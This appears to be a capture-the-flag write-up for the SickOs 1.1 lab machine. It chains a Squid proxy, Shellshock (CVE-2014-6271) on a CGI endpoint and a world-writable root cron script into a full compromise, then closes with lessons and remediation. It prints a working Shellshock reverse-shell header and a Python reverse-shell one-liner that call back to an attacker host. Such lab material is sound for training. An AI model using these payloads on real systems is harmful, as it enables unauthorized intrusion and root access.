# SickOs: 1.1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Intermediate |
| **OS** | Linux (Ubuntu) |
| **Flag** | `/root/a0216ea4d51874464078c618298b1367.txt` |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/sickos-11,132/) |

## Attack Summary

Network scan → SQUID proxy on port 3128 → route HTTP through proxy → `/cgi-bin/status` → Shellshock (CVE-2014-6271) → reverse shell as `www-data` → writable cron.d script → root shell.

## Methodology

1. Network discovery and port scan
2. Discover SQUID proxy on port 3128
3. Use SQUID proxy to reach internal web server
4. Discover `/cgi-bin/status` endpoint
5. Exploit Shellshock via the proxy
6. Post-exploitation — cron privesc

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- 192.168.56.X
```

Key open ports:
- **22** — SSH (OpenSSH)
- **3128** — HTTP (SQUID proxy 3.1.19)
- **80** — HTTP (closed/filtered directly)

The web server on port 80 is not directly accessible but is reachable through the SQUID proxy.

---

## Step 2: Enumerate Through SQUID Proxy

Configure curl to use the proxy and access the web server:

```bash
curl -x http://192.168.56.X:3128 http://192.168.56.X/
curl -x http://192.168.56.X:3128 http://192.168.56.X/robots.txt
```

`robots.txt` output:
```
User-agent: *
Disallow: /
Disallow: /wolfcms
```

Access the CMS:

```bash
curl -x http://192.168.56.X:3128 http://192.168.56.X/wolfcms/
```

---

## Step 3: Discover CGI Endpoint

Enumerate paths through the proxy:

```bash
# Check common CGI paths
curl -x http://192.168.56.X:3128 http://192.168.56.X/cgi-bin/status
```

The endpoint responds — this means the Bash-based CGI script is running. Test for Shellshock:

```bash
curl -x http://192.168.56.X:3128 \
  -H "User-Agent: () { :; }; echo; echo vulnerable" \
  http://192.168.56.X/cgi-bin/status
```

If "vulnerable" appears in the response body, Shellshock is confirmed.

---

## Step 4: Shellshock Reverse Shell (CVE-2014-6271)

Start a netcat listener:

```bash
nc -lvnp 4444
```

Send the reverse shell payload through the proxy:

```bash
curl -x http://192.168.56.X:3128 \
  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.56.1/4444 0>&1" \
  http://192.168.56.X/cgi-bin/status
```

Reverse shell received as `www-data`.

Upgrade the shell:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Step 5: Privilege Escalation — Writable Cron Script

```bash
ls -la /etc/cron.d/
cat /etc/cron.d/automate
# * * * * * root /usr/bin/python /var/www/connect.py

ls -la /var/www/connect.py
# -rwxrwxrwx ... /var/www/connect.py  ← world-writable!
```

The script is world-writable and runs as root every minute. Inject a reverse shell:

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /var/www/connect.py
```

Start a second listener:

```bash
nc -lvnp 5555
```

Within 60 seconds, root shell arrives.

---

## Step 6: Capture the Flag

```bash
id
# uid=0(root) gid=0(root)

ls /root/
cat /root/a0216ea4d51874464078c618298b1367.txt
# If you are viewing this!!
# ROOT!
# You have successfully compromised the system.
# Congratulations!
```

---

## Lessons Learned

1. **SQUID proxy** allowed access to a web server not reachable directly — always scan for proxy services
2. **Shellshock** (CVE-2014-6271) affects Bash versions before 4.3 patch 25; update Bash
3. **CGI scripts running Bash** are the attack vector for Shellshock — use CGI with other interpreters or disable unnecessary CGI endpoints
4. **World-writable cron scripts** running as root are critical misconfigurations
5. **Minimal firewall** — SQUID proxy should not be exposed externally

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| Shellshock (CVE-2014-6271) | Update Bash to ≥ 4.3 patch 25 |
| SQUID proxy exposed | Restrict proxy to localhost or internal network only |
| World-writable cron script | `chmod 700 /var/www/connect.py; chown root:root` |
| CGI on Apache | Disable if not needed; use non-Bash interpreters |
